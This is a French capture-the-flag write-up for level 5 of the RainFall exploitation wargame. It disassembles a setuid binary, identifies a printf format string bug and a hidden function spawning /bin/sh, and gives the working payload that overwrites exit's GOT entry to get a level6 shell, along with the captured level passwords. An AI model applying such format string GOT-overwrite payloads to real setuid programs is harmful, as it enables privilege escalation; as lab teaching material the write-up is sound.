# LEVEL 5

### Reconnaissance

On se connecte au level5 avec le password : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

On trouve un binaire 

```
level5@192.168.56.102's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)                                                                          
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE                                             
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5 
level5@RainFall:~$ ls
level5
level5@RainFall:~$ file level5
level5: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xed1835fb7b09db7da4238a6fa717ad9fd835ae92, not stripped
level5@RainFall:~$ (python -c 'print "AAAA" + "%x " * 20' )|./level5 
AAAA200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 a
```

On le télécharge pour l'analysé avec r2 mais on sait déjà que c'est une vulnérabilité format string.
```
[...]
[0x080483f0]> pdf@sym.n
[...]
|           0x080484e5      e8b6feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│           0x080484ea      8d85f8fdffff   lea eax, dword [format]
│           0x080484f0      890424         mov dword [esp], eax        ; const char *format
│           0x080484f3      e888feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x080484f8      c70424010000.  mov dword [esp], 1          ; int status
└           0x080484ff      e8ccfeffff     call sym.imp.exit           ; void exit(int status)

```

Effectivement, on voit l'appel a fgets puis a printf. Le code prend un paramètre et l'affiche, rien d'autre.
En regardant bien, on a une autre fonction:

```
$ nm level5 |grep T
[...]
08048504 T main
080484c2 T n
080484a4 T o
[...]
```

On regarde avec r2:
```
[0x080483f0]> pdf@sym.o
┌ 30: sym.o ();
│           0x080484a4      55             push ebp
│           0x080484a5      89e5           mov ebp, esp
│           0x080484a7      83ec18         sub esp, 0x18
│           0x080484aa      c70424f08504.  mov dword [esp], str.bin_sh ; [0x80485f0:4]=0x6e69622f ; "/bin/sh" ; const char *string
│           0x080484b1      e8fafeffff     call sym.imp.system         ; int system(const char *string)
│           0x080484b6      c70424010000.  mov dword [esp], 1          ; int status
└           0x080484bd      e8cefeffff     call sym.imp._exit          ; void _exit(int status)
```

On va donc détourné le comportement du programme pour appelé cette fonction.
Le problème par rapport aux level précédent c'est la fonction exit après printf. Le programme quittera avant l'aller voir ce qu'on a pu écrire sur l'EIP.
Il faut donc ecrire sur la fonction exit, allons chercher son adresse:

```
$ objdumpt -d level5
[...]
080483d0 <exit@plt>:
 80483d0:       ff 25 38 98 04 08       jmp    *0x8049838
 80483d6:       68 28 00 00 00          push   $0x28
 80483db:       e9 90 ff ff ff          jmp    8048370 <_init+0x3c>
[...]
```

### Exploitation

Il nous faut:
```
L'adresse de o : 0x080484a4
L'adresse de exit : 0x08049838 (En réalité c'est 080483d0 mais il fait appel a un jmp a 0x8049838)
La position ou ecrire sur la stack : 4

On a pu récupéré ces 3 elements lors de la reconnaissance
```

On converti l'adresse de exit:
```
Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
[GCC 9.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0x08049838)
'8\x98\x04\x08'
```

On récupére la valeur décimal de o:
```
>>> 0x080484a4
134513828
```

Maintenant on peux préparé notre payload:
```
[ADDRESSE DE EXIT]%[VALEUR DE o - 4 bytes]d%4$n

[8\x98\x04\x08][%134513824d%4$n]
```

Et le lancer:
```
level5@RainFall:~$ (python -c 'print "8\x98\x04\x08" + "%134513824d%4$n"'; cat)|./level5
[...]
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
whoami
level6
id
uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
```

Enjoy :)
